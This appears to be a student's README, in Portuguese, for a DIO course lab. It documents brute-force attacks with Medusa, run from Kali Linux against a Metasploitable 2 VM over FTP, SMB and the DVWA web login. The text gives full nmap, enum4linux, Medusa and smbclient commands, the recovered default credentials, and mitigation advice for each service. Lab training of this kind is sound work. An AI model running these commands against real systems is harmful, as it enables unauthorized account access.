# dio-kali-medusa-challenge
# Desafio DIO: Ataques de Força Bruta com Kali e Medusa

Este repositório documenta a execução do desafio "Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa" da plataforma DIO.

## 1. Descrição do Projeto

O objetivo foi configurar um ambiente de pentest controlado (Kali Linux vs. Metasploitable 2) para simular ataques de força bruta contra diferentes serviços (FTP, SMB, HTTP/DVWA) usando a ferramenta Medusa, documentando todo o processo.

## 2. Configuração do Ambiente

* **Software de Virtualização:** VirtualBox
* **VM Atacante:** Kali Linux (IP: `192.168.56.101`)
* **VM Alvo:** Metasploitable 2 (IP: `192.168.56.102`)
* **Configuração de Rede:** Modo "Host-Only" (Rede Apenas de Anfitrião) para isolar o laboratório.

## 3. Ferramentas Utilizadas

* `nmap`: Usado para o reconhecimento inicial de portas e serviços.
* `echo`: Utilizado para criar as wordlists personalizadas.
* `enum4linux`: Ferramenta de enumeração específica para SMB/Windows.
* `medusa`: Ferramenta principal para os ataques de força bruta.
* `smbclient`: Usado para validar o acesso ao SMB após o sucesso do ataque.

---

## 4. Preparação e Execução dos Ataques

### 4.1. Criação de Wordlists Iniciais

Antes de iniciar os ataques, foram criados arquivos (`.txt`) contendo listas de possíveis usuários e senhas para os primeiros testes.

Bash
# Criação do arquivo de usuários
`echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`

# Criação do arquivo de senhas
`echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`

4.2. Ataque 1: Brute Force em FTP (File Transfer Protocol)
Comando de Scan (Nmap):
Bash

`nmap -sV -p 21 192.168.56.102`
Comando de Ataque (Medusa):

Bash

`medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6`
Resultado:

`ACCOUNT FOUND: User: msfadmin Password: msfadmin [SUCCESS])`

Recomendação de Mitigação:

Utilizar senhas fortes e complexas.

Implementar bloqueio de conta após X tentativas falhas.

Limitar o acesso ao FTP apenas para IPs confiáveis.

4.3. Ataque 2: Enumeração e Força Bruta em SMB
Para este ataque, foi feita uma enumeração detalhada para criar listas de usuários e senhas mais assertivas.

Comando de Enumeração (Enum4linux):

Bash

`enum4linux -a 192.168.56.102 | tee enum4_output.txt`
Resultado da Enumeração:

A ferramenta enum4linux identificou uma lista de usuários válidos no sistema, incluindo msfadmin, user, root, service, etc. (Como visto no arquivo enum4_output.txt).

Criação de Wordlists para SMB:

Com base nos usuários encontrados, novas listas foram criadas:

Bash

`echo -e "user\nmsfadmin\nservice" > smb_users.txt`
`echo -e "password\n123456\nWelCome123\nmsfadmin" > senhas_spray.txt`
Comando de Ataque (Medusa):

Bash

`medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`
Resultado do Ataque:

O Medusa encontrou uma credencial válida: `ACCOUNT FOUND: User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]`

Validação de Acesso (smbclient):

Para confirmar o acesso, listamos os compartilhamentos SMB com a credencial encontrada:

Bash

`smbclient -L //192.168.56.102 -U msfadmin`
Resultado da Validação:

O comando retornou a lista de compartilhamentos, confirmando o acesso: print$, tmp, opt, IPC$, ADMIN$, msfadmin.

Recomendação de Mitigação:

Implementar uma política de senhas fortes.

Monitorar logs para detectar múltiplas falhas de login.

Desabilitar a enumeração de usuários anônimos no SMB (alterando a configuração do smb.conf).

4.4. Ataque 3: Brute Force em Formulário Web (DVWA)
Comando de Scan (Nmap):

Bash

`nmap -sV -p 80 192.168.56.102`
Comando de Ataque (Medusa):

Bash

`medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6`
Resultado:

`ACCOUNT FOUND: User: admin Password: password [SUCCESS])`

Recomendação de Mitigação:

Implementar um CAPTCHA para diferenciar humanos de bots.
imitar a taxa de tentativas de login (Rate Limiting).
Bloqueio temporário de IP após múltiplas falhas.
